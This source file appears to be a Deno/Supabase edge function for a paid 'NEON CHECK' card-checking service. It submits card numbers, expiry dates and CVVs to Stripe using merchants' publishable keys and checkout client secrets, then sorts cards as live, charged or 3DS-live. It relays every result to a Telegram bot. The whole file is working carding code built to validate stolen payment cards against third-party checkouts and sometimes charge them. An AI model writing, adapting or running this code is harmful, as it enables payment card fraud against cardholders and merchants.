import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

interface CardData {
  number: string;
  month: string;
  year: string;
  cvv: string;
}

interface CheckResult {
  card: string;
  status: 'live' | 'charged' | 'declined' | '3ds' | 'error';
  code: string;
  message: string;
  responseTime: number;
  bin: string;
  brand: string;
}

function getCardBrand(num: string): string {
  if (/^3[47]/.test(num)) return 'AMEX';
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'MC';
  if (/^4/.test(num)) return 'VISA';
  if (/^6(?:011|5)/.test(num)) return 'DISC';
  return 'UNK';
}

async function checkStripe(card: CardData, stripePk: string, clientSecret: string | null): Promise<CheckResult> {
  const startTime = Date.now();
  const masked = `${card.number.slice(0, 6)}...${card.number.slice(-4)}`;
  const bin = card.number.slice(0, 6);
  const brand = getCardBrand(card.number);

  try {
    // Create payment method
    const pmRes = await fetch('https://api.stripe.com/v1/payment_methods', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${stripePk}`,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams({
        'type': 'card',
        'card[number]': card.number,
        'card[exp_month]': card.month,
        'card[exp_year]': card.year.length === 2 ? `20${card.year}` : card.year,
        'card[cvc]': card.cvv,
        'billing_details[address][country]': 'US',
      }).toString(),
    });

    const pmData = await pmRes.json();
    const elapsed = (Date.now() - startTime) / 1000;

    if (pmData.error) {
      return {
        card: masked,
        status: 'declined',
        code: pmData.error.decline_code || pmData.error.code || 'unknown',
        message: pmData.error.message || 'Declined',
        responseTime: elapsed,
        bin,
        brand,
      };
    }

    // If we have a client secret, try to confirm
    if (clientSecret) {
      const piId = clientSecret.split('_secret_')[0];
      const confirmRes = await fetch(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${stripePk}`,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          'payment_method': pmData.id,
          'return_url': 'https://example.com/return',
        }).toString(),
      });

      const confirmData = await confirmRes.json();
      const elapsed2 = (Date.now() - startTime) / 1000;

      if (confirmData.error) {
        return {
          card: masked,
          status: 'declined',
          code: confirmData.error.decline_code || confirmData.error.code || 'unknown',
          message: confirmData.error.message || 'Declined',
          responseTime: elapsed2,
          bin,
          brand,
        };
      }

      if (confirmData.status === 'succeeded') {
        return {
          card: masked,
          status: 'charged',
          code: 'approved',
          message: `Charged! Receipt: ${confirmData.charges?.data?.[0]?.receipt_url || 'N/A'}`,
          responseTime: elapsed2,
          bin,
          brand,
        };
      }

      if (confirmData.status === 'requires_action') {
        return {
          card: masked,
          status: '3ds',
          code: 'requires_authentication',
          message: '3DS Required - Card is live',
          responseTime: elapsed2,
          bin,
          brand,
        };
      }

      return {
        card: masked,
        status: 'declined',
        code: confirmData.status || 'unknown',
        message: `Status: ${confirmData.status}`,
        responseTime: elapsed2,
        bin,
        brand,
      };
    }

    // No client secret — card validated via payment method creation
    return {
      card: masked,
      status: 'live',
      code: 'pm_created',
      message: `Card validated (${pmData.card?.brand || brand})`,
      responseTime: elapsed,
      bin,
      brand,
    };

  } catch (error: unknown) {
    const elapsed = (Date.now() - startTime) / 1000;
    const msg = error instanceof Error ? error.message : 'Unknown error';
    return {
      card: masked,
      status: 'error',
      code: 'exception',
      message: msg,
      responseTime: elapsed,
      bin,
      brand,
    };
  }
}

async function sendTelegram(result: CheckResult, merchant: string, amount: string | null): Promise<void> {
  const botToken = Deno.env.get('TG_BOT_TOKEN');
  const chatId = Deno.env.get('TG_CHAT_ID');
  if (!botToken || !chatId) return;

  const isHit = result.status === 'live' || result.status === 'charged' || result.status === '3ds';
  const emoji = isHit ? '🟢' : '🔴';
  const statusLabel = result.status === 'charged' ? '💰 CHARGED' :
                      result.status === 'live' ? '✅ LIVE' :
                      result.status === '3ds' ? '🔐 3DS (LIVE)' :
                      `❌ ${result.code.toUpperCase()}`;

  const text = `${emoji} <b>NEON CHECK</b>\n\n` +
    `💳 <code>${result.card}</code>\n` +
    `📊 ${statusLabel}\n` +
    `🏢 ${merchant}\n` +
    (amount ? `💰 ${amount}\n` : '') +
    `🏷️ BIN: <code>${result.bin}</code> | ${result.brand}\n` +
    `⏱️ ${result.responseTime.toFixed(2)}s\n` +
    `📝 ${result.message}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      }),
    });
  } catch {
    // Silent fail for TG
  }
}

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });

  try {
    const { card, provider, stripePk, clientSecret, merchant, amount, accessKey } = await req.json();

    if (!card || !accessKey) {
      return new Response(JSON.stringify({ error: 'Missing required fields' }), {
        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Validate access key
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
    );

    const { data: keyData } = await supabase
      .from('access_keys')
      .select('*')
      .eq('key', accessKey)
      .eq('is_active', true)
      .single();

    if (!keyData) {
      return new Response(JSON.stringify({ error: 'Invalid access key' }), {
        status: 403, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    let result: CheckResult;

    if (provider === 'stripe' && stripePk) {
      result = await checkStripe(card, stripePk, clientSecret);
    } else if (stripePk) {
      // Many providers use Stripe under the hood
      result = await checkStripe(card, stripePk, clientSecret);
    } else {
      const masked = `${card.number.slice(0, 6)}...${card.number.slice(-4)}`;
      result = {
        card: masked,
        status: 'error',
        code: 'no_stripe_pk',
        message: `Provider "${provider}" detected but no Stripe key found. Only Stripe-powered checkouts are currently supported.`,
        responseTime: 0,
        bin: card.number.slice(0, 6),
        brand: getCardBrand(card.number),
      };
    }

    // Send all results to TG (hits, declines, everything)
    await sendTelegram(result, merchant || 'Unknown', amount);

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: msg }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
